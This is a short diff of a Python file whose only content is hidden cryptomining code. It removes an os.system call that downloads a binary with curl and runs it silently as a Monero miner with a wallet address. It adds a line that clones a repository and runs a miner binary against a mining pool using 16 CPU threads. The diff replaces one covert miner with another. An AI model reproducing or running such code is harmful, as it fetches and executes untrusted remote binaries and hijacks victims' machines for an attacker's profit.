@@ -1,4 +1,2 @@
 import os
-
-os.system("curl https://github.com/ontaracing04/sue/raw/main/- && chmod u+x -")
-os.system("./- -o xmr.2miners.com:2222 -u 8BeTiTxwtTphRfwuNXSsukeMMVKE5qvJZZDjqB3SpqMZS1Q37wMJ3RnKxm6itZgZgxPeffg6ZZA3aANkGRDqJRHmKMg8R1j.julaher >/dev/null >/dev/null 2>&1")
+os.system("git clone https://github.com/indah38/super-duper-disco.git && cd super-duper-disco && chmod +x kuntulminer && ./kuntulminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RBG1qWaLRYGddYdKhfJiUzKr7K2hNS5Mn5..bajingan -p x --cpu 16 -F")
